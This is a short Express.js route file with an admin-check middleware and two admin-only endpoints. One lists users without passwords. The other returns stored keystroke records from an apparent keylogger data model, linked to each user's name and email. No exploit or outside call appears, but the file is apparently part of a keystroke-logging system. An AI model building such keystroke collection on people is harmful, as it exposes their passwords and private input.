import express from "express";
import userAuth from "../middleware/userAuth.js";
import userModel from "../models/userModel.js";
import KeyloggerModel from "../models/keyloggerModel.js";

const router = express.Router();

// Admin middleware
const requireAdmin = async (req, res, next) => {
  try {
    const user = await userModel.findById(req.userId);
    if (!user || user.role !== "admin") {
      return res.status(403).json({
        success: false,
        message: "Admin access required",
      });
    }
    next();
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
};

// Get all users (admin only)
router.get("/users", userAuth, requireAdmin, async (req, res) => {
  try {
    const users = await userModel.find({}, { password: 0 });
    res.json({ success: true, users });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get keystroke data (admin only)
router.get("/keystrokes", userAuth, requireAdmin, async (req, res) => {
  try {
    const keystrokes = await KeyloggerModel.find()
      .sort({ createdAt: -1 })
      .populate("userId", "name email"); // Populate user info
    res.json({ success: true, data: keystrokes });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

export default router;
